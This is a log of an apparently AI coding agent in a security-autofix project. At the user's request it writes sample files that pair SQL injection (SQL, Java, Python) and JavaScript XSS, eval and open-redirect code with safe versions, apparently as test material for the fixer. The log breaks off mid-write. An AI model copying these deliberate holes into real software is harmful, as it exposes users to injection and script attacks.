          "parameters": "{"command":"mkdir -p /Users/jonathanafek/src/autofixer/_samples && cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/","requireUserApproval":true,"parsingResult":{"executableCommands":[{"name":"mkdir","args":[{"type":"word","value":"-p"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/_samples"}],"fullText":"mkdir -p /Users/jonathanafek/src/autofixer/_samples"},{"name":"cp","args":[{"type":"word","value":"-r"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/patchino/_samples/*"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/_samples/"}],"fullText":"cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/"}]},"requestedSandboxPolicy":{"type":"TYPE_INSECURE_NONE"}}",
          "rawArguments": "{"command": "mkdir -p /Users/jonathanafek/src/autofixer/_samples && cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/", "is_background": false}",
          "result": "{"humanReviewV2":{"selectedOption":"skip"}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:07.629Z,
        "text": "Reading the files and creating them in the new location using the file tools:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:07.684Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json","charsLimit":100000,"effectiveUri":"file:///Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "result": "{"contents":"{\\n    \\"created_at\\": 1745851637,\\n    \\"issues\\": [\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 8,\\n            \\"issue_object_hash\\": \\"d1425b8d47d7597c49881ec70f4a8b75\\",\\n            \\"path_to_issue_object\\": \\"d1425b8d47d7597c49881ec70f4a8b75.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d1425b8d47d7597c49881ec70f4a8b75.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"30f70896dc317958633ad1fde6d79566\\",\\n            \\"path_to_issue_object\\": \\"30f70896dc317958633ad1fde6d79566.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"30f70896dc317958633ad1fde6d79566.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 32,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 31,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 27,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 30,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 29,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 12,\\n            \\"issue_object_hash\\": \\"12e36579cafa09e786f12c4a257ca4e7\\",\\n            \\"path_to_issue_object\\": \\"12e36579cafa09e786f12c4a257ca4e7.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"12e36579cafa09e786f12c4a257ca4e7.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 28,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"bc90c5d567713c3a4b7f2aece525894e\\",\\n            \\"path_to_issue_object\\": \\"bc90c5d567713c3a4b7f2aece525894e.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bc90c5d567713c3a4b7f2aece525894e.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        }\\n    ]\\n}","numCharactersInRequestedRange":7367,"totalLinesInFile":145}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:07.684Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "run_terminal_cmd",
          "parameters": "{"command":"ls -la /Users/jonathanafek/src/autofixer/patchino/_samples/","requireUserApproval":true,"parsingResult":{"executableCommands":[{"name":"ls","args":[{"type":"word","value":"-la"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/patchino/_samples/"}],"fullText":"ls -la /Users/jonathanafek/src/autofixer/patchino/_samples/"}]},"requestedSandboxPolicy":{"type":"TYPE_INSECURE_NONE"}}",
          "rawArguments": "{"command": "ls -la /Users/jonathanafek/src/autofixer/patchino/_samples/", "is_background": false}",
          "result": "{"humanReviewV2":{"selectedOption":"skip"}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:20.058Z,
        "text": "add 2 sample code files in the repo root",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:28.571Z,
        "text": "Adding 2 sample code files to the repo root. Creating examples relevant to this security analysis tool.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:28.708Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_vulnerable.sql"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_vulnerable.sql", "contents": "-- Sample Vulnerable SQL Query\\n-- This demonstrates a SQL injection vulnerability\\n\\n-- Vulnerable: Direct string concatenation with user input\\nCREATE OR REPLACE FUNCTION get_user(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\nDECLARE\\n    query TEXT;\\nBEGIN\\n    -- VULNERABLE: Direct concatenation allows SQL injection\\n    query := 'SELECT username, email FROM users WHERE id = ''' || id_param || '''';\\n    RETURN QUERY EXECUTE query;\\nEND;\\n$$ LANGUAGE plpgsql;\\n\\n-- Safe: Using parameterized queries\\nCREATE OR REPLACE FUNCTION get_user_safe(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\nBEGIN\\n    -- SAFE: Parameterized query prevents SQL injection\\n    RETURN QUERY SELECT username, email FROM users WHERE id = id_param;\\nEND;\\n$$ LANGUAGE plpgsql;"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ -- Sample Vulnerable SQL Query\\n+ -- This demonstrates a SQL injection vulnerability\\n+ \\n+ -- Vulnerable: Direct string concatenation with user input\\n+ CREATE OR REPLACE FUNCTION get_user(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\n+ DECLARE\\n+     query TEXT;\\n+ BEGIN\\n+     -- VULNERABLE: Direct concatenation allows SQL injection\\n+     query := 'SELECT username, email FROM users WHERE id = ''' || id_param || '''';\\n+     RETURN QUERY EXECUTE query;\\n+ END;\\n+ $$ LANGUAGE plpgsql;\\n+ \\n+ -- Safe: Using parameterized queries\\n+ CREATE OR REPLACE FUNCTION get_user_safe(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\n+ BEGIN\\n+     -- SAFE: Parameterized query prevents SQL injection\\n+     RETURN QUERY SELECT username, email FROM users WHERE id = id_param;\\n+ END;\\n+ $$ LANGUAGE plpgsql;","oldStart":1,"newStart":1,"oldLines":1,"newLines":21,"linesRemoved":1,"linesAdded":21}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_vulnerable.sql."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:28.708Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_java_sqli.java"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_java_sqli.java", "contents": "import java.sql.Connection;\\nimport java.sql.Statement;\\nimport java.sql.ResultSet;\\nimport java.sql.DriverManager;\\nimport java.sql.SQLException;\\n\\n/**\\n * Sample Java code demonstrating SQL Injection vulnerability and fix\\n */\\npublic class SampleSQLInjection {\\n\\n    // VULNERABLE: Direct string concatenation\\n    public ResultSet getUserUnsafe(String userId) throws SQLException {\\n        Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n        \\n        // UNSAFE: User input directly concatenated into query\\n        String query = \\"SELECT * FROM users WHERE id = '\\" + userId + \\"'\\";\\n        Statement stmt = conn.createStatement();\\n        return stmt.executeQuery(query);\\n    }\\n\\n    // SAFE: Using PreparedStatement with parameters\\n    public ResultSet getUserSafe(String userId) throws SQLException {\\n        Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n        \\n        // SAFE: Parameterized query prevents SQL injection\\n        String query = \\"SELECT * FROM users WHERE id = ?\\";\\n        java.sql.PreparedStatement pstmt = conn.prepareStatement(query);\\n        pstmt.setString(1, userId);\\n        return pstmt.executeQuery();\\n    }\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ import java.sql.Connection;\\n+ import java.sql.Statement;\\n+ import java.sql.ResultSet;\\n+ import java.sql.DriverManager;\\n+ import java.sql.SQLException;\\n+ \\n+ /**\\n+  * Sample Java code demonstrating SQL Injection vulnerability and fix\\n+  */\\n+ public class SampleSQLInjection {\\n+ \\n+     // VULNERABLE: Direct string concatenation\\n+     public ResultSet getUserUnsafe(String userId) throws SQLException {\\n+         Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n+         \\n+         // UNSAFE: User input directly concatenated into query\\n+         String query = \\"SELECT * FROM users WHERE id = '\\" + userId + \\"'\\";\\n+         Statement stmt = conn.createStatement();\\n+         return stmt.executeQuery(query);\\n+     }\\n+ \\n+     // SAFE: Using PreparedStatement with parameters\\n+     public ResultSet getUserSafe(String userId) throws SQLException {\\n+         Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n+         \\n+         // SAFE: Parameterized query prevents SQL injection\\n+         String query = \\"SELECT * FROM users WHERE id = ?\\";\\n+         java.sql.PreparedStatement pstmt = conn.prepareStatement(query);\\n+         pstmt.setString(1, userId);\\n+         return pstmt.executeQuery();\\n+     }\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":32,"linesRemoved":1,"linesAdded":32}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_java_sqli.java."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:46.419Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_java_sqli.java"]}",
          "rawArguments": "{"paths": ["sample_java_sqli.java"]}",
          "result": "{"path":"sample_java_sqli.java"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:57.099Z,
        "text": "Added 2 sample code files in the repo root:

1. **\`sample_vulnerable.sql\`** — Shows a SQL injection vulnerability in PostgreSQL (direct string concatenation) and a safe parameterized version.
2. **\`sample_java_sqli.java\`** — Shows a SQL injection vulnerability in Java (unsafe string concatenation) and a safe PreparedStatement version.

Both files include vulnerable and safe examples, which aligns with the project's security analysis and fixing focus.",
        "tokens": {
          "inputCount": 37522,
          "outputCount": 934,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "sample_vulnerable.sql",
            "startLine": 1,
          },
          {
            "relativePath": "sample_java_sqli.java",
            "startLine": 1,
          },
        ],
        "date": 2025-10-29T16:50:27.413Z,
        "text": "add 2 more sample files",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:30.766Z,
        "text": "Adding two more sample code files to the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:30.786Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_python_sqli.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_python_sqli.py", "contents": "\\"\\"\\"\\nSample Python code demonstrating SQL Injection vulnerability and fix\\n\\"\\"\\"\\n\\nimport sqlite3\\n\\n# VULNERABLE: Direct string formatting with user input\\ndef get_user_unsafe(user_id: str):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    \\n    # UNSAFE: User input directly formatted into query\\n    query = f\\"SELECT * FROM users WHERE id = '{user_id}'\\"\\n    cursor.execute(query)\\n    return cursor.fetchall()\\n\\n# SAFE: Using parameterized queries\\ndef get_user_safe(user_id: str):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    \\n    # SAFE: Parameterized query prevents SQL injection\\n    query = \\"SELECT * FROM users WHERE id = ?\\"\\n    cursor.execute(query, (user_id,))\\n    return cursor.fetchall()\\n\\n# Also UNSAFE: Using string formatting or % operator\\ndef get_user_unsafe_format(user_id: str):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    \\n    # UNSAFE: % formatting still vulnerable\\n    query = \\"SELECT * FROM users WHERE id = '%s'\\" % user_id\\n    cursor.execute(query)\\n    return cursor.fetchall()"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ \\"\\"\\"\\n+ Sample Python code demonstrating SQL Injection vulnerability and fix\\n+ \\"\\"\\"\\n+ \\n+ import sqlite3\\n+ \\n+ # VULNERABLE: Direct string formatting with user input\\n+ def get_user_unsafe(user_id: str):\\n+     conn = sqlite3.connect('database.db')\\n+     cursor = conn.cursor()\\n+     \\n+     # UNSAFE: User input directly formatted into query\\n+     query = f\\"SELECT * FROM users WHERE id = '{user_id}'\\"\\n+     cursor.execute(query)\\n+     return cursor.fetchall()\\n+ \\n+ # SAFE: Using parameterized queries\\n+ def get_user_safe(user_id: str):\\n+     conn = sqlite3.connect('database.db')\\n+     cursor = conn.cursor()\\n+     \\n+     # SAFE: Parameterized query prevents SQL injection\\n+     query = \\"SELECT * FROM users WHERE id = ?\\"\\n+     cursor.execute(query, (user_id,))\\n+     return cursor.fetchall()\\n+ \\n+ # Also UNSAFE: Using string formatting or % operator\\n+ def get_user_unsafe_format(user_id: str):\\n+     conn = sqlite3.connect('database.db')\\n+     cursor = conn.cursor()\\n+     \\n+     # UNSAFE: % formatting still vulnerable\\n+     query = \\"SELECT * FROM users WHERE id = '%s'\\" % user_id\\n+     cursor.execute(query)\\n+     return cursor.fetchall()","oldStart":1,"newStart":1,"oldLines":1,"newLines":35,"linesRemoved":1,"linesAdded":35}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_python_sqli.py."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:30.786Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js", "contents": "/**\\n * Sample JavaScript code demonstrating XSS (Cross-Site Scripting) vulnerability and fix\\n */\\n\\n// VULNERABLE: Direct DOM manipulation with user input\\nfunction displayMessageUnsafe(userMessage) {\\n    const element = document.getElementById('message');\\n    // UNSAFE: User input directly inserted into innerHTML - vulnerable to XSS\\n    element.innerHTML = userMessage; // If userMessage contains <script> tags, they will execute\\n}\\n\\n// SAFE: Using textContent instead of innerHTML\\nfunction displayMessageSafe(userMessage) {\\n    const element = document.getElementById('message');\\n    // SAFE: textContent escapes HTML and prevents script execution\\n    element.textContent = userMessage;\\n}\\n\\n// SAFE: Using DOM methods and sanitization\\nfunction displayMessageSafeSanitized(userMessage) {\\n    const element = document.getElementById('message');\\n    // SAFE: Create text node to ensure no HTML is interpreted\\n    const textNode = document.createTextNode(userMessage);\\n    element.appendChild(textNode);\\n}\\n\\n// VULNERABLE: Using eval with user input\\nfunction evaluateUserCodeUnsafe(userCode) {\\n    // UNSAFE: eval executes arbitrary JavaScript code\\n    return eval(userCode); // Extremely dangerous - never do this!\\n}\\n\\n// Example of safe alternative\\nfunction evaluateUserCodeSafe(userCode) {\\n    // SAFE: Use a sandboxed environment or parser\\n    // In production, use proper code evaluation libraries with restrictions\\n    throw new Error('Direct code evaluation not allowed. Use a secure sandbox.');\\n}\\n\\n// VULNERABLE: Setting location with user input\\nfunction redirectUnsafe(url) {\\n    // UNSAFE: User-controlled URL can lead to malicious redirects\\n    window.location.href = url; // Could be javascript: or data: URL\\n}\\n\\n// SAFE: Validating URL before redirect\\nfunction redirectSafe(url) {\\n    // SAFE: Validate URL is from allowed domains\\n    try {\\n        const urlObj = new URL(url);\\n        const allowedDomains = ['example.com', 'trusted-site.com'];\\n        if (allowedDomains.includes(urlObj.hostname)) {\\n            window.location.href = url;\\n        } else {\\n            throw new Error('Redirect to unauthorized domain blocked');\\n        }\\n    } catch (e) {\\n        console.error('Invalid URL:', e);\\n    }\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ /**\\n+  * Sample JavaScript code demonstrating XSS (Cross-Site Scripting) vulnerability and fix\\n+  */\\n+ \\n+ // VULNERABLE: Direct DOM manipulation with user input\\n+ function displayMessageUnsafe(userMessage) {\\n+     const element = document.getElementById('message');\\n+     // UNSAFE: User input directly inserted into innerHTML - vulnerable to XSS\\n+     element.innerHTML = userMessage; // If userMessage contains <script> tags, they will execute\\n+ }\\n+ \\n+ // SAFE: Using textContent instead of innerHTML\\n+ function displayMessageSafe(userMessage) {\\n+     const element = document.getElementById('message');\\n+     // SAFE: textContent escapes HTML and prevents script execution\\n+     element.textContent = userMessage;\\n+ }\\n+ \\n+ // SAFE: Using DOM methods and sanitization\\n+ function displayMessageSafeSanitized(userMessage) {\\n+     const element = document.getElementById('message');\\n+     // SAFE: Create text node to ensure no HTML is interpreted\\n+     const textNode = document.createTextNode(userMessage);\\n+     element.appendChild(textNode);\\n+ }\\n+ \\n+ // VULNERABLE: Using eval with user input\\n+ function evaluateUserCodeUnsafe(userCode) {\\n+     // UNSAFE: eval executes arbitrary JavaScript code\\n+     return eval(userCode); // Extremely dangerous - never do this!\\n+ }\\n+ \\n+ // Example of safe alternative\\n+ function evaluateUserCodeSafe(userCode) {\\n+     // SAFE: Use a sandboxed environment or parser\\n+     // In production, use proper code evaluation libraries with restrictions\\n+     throw new Error('Direct code evaluation not allowed. Use a secure sandbox.');\\n+ }\\n+ \\n+ // VULNERABLE: Setting location with user input\\n+ function redirectUnsafe(url) {\\n+     // UNSAFE: User-controlled URL can lead to malicious redirects\\n+     window.location.href = url; // Could be javascript: or data: URL\\n+ }\\n+ \\n+ // SAFE: Validating URL before redirect\\n+ function redirectSafe(url) {\\n+     // SAFE: Validate URL is from allowed domains\\n+     try {\\n+         const urlObj = new URL(url);\\n+         const allowedDomains = ['example.com', 'trusted-site.com'];\\n+         if (allowedDomains.includes(urlObj.hostname)) {\\n+             window.location.href = url;\\n+         } else {\\n+             throw new Error('Redirect to unauthorized domain blocked');\\n+         }\\n+     } catch (e) {\\n+         console.error('Invalid URL:', e);\\n+     }\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":60,"linesRemoved":1,"linesAdded":60}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_xss_vulnerable.js."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:47.799Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_python_sqli.py","sample_xss_vulnerable.js"]}",
          "rawArguments": "{"paths": ["sample_python_sqli.py","sample_xss_vulnerable.js"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:52.922Z,
        "text": "Added 2 more sample code files:

1. **\`sample_python_sqli.py\`** — SQL injection examples in Python (unsafe f-strings/formatting and a safe parameterized query).

2. **\`sample_xss_vulnerable.js\`** — XSS examples in JavaScript covering:
   - Unsafe \`innerHTML\` usage
   - Safe \`textContent\` usage
   - Dangerous \`eval()\` usage
   - Unsafe redirects vs. validated redirects

All 4 sample files (2 from before + 2 new) are in the repo root and demonstrate common security vulnerabilities with both vulnerable and safe patterns.",
        "tokens": {
          "inputCount": 38831,
          "outputCount": 1090,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "sample_python_sqli.py",
            "startLine": 1,
          },
          {
            "relativePath": "sample_xss_vulnerable.js",
            "startLine": 1,
          },
        ],
        "date": 2025-10-29T16:51:01.028Z,
        "text": "and 2 more files",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:04.165Z,
        "text": "Adding 2 more sample code files to the repo root.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:51:04.231Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_insecure_random.py"}",
